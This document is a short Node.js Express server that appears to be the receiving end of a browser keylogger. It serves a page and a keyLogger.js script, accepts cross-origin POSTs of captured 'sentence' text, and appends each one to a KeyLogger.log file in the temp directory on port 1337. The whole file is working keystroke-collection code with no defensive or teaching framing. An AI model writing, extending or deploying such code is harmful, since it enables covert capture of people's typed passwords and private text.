const fs = require('fs');
const path = require('path');
const cors = require('cors');
const bodyParser = require('body-parser');

const tempDir = require('os').tmpdir();

const logFileName = 'KeyLogger.log';

var logFile = path.join(tempDir, logFileName)



var express = require('express');
var app = express();
app.use(cors()); // to support Cross Origin Requests
app.use(bodyParser.json()); // support json encoded bodies
app.use(bodyParser.urlencoded({ extended: true })); // support encoded bodies

app.get('/', function (req, res) {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/keyLogger.js', function (req, res) {
    res.sendFile(path.join(__dirname, 'keyLogger.js'));
});

app.post('/keyLogger', function (req, res) {
    var data = req.body.sentence + '\n';
    fs.appendFile(logFile, data, error => {
        if (error)
            res.sendStatus(500);
        else
            res.sendStatus(200);
    });
});

app.listen(1337);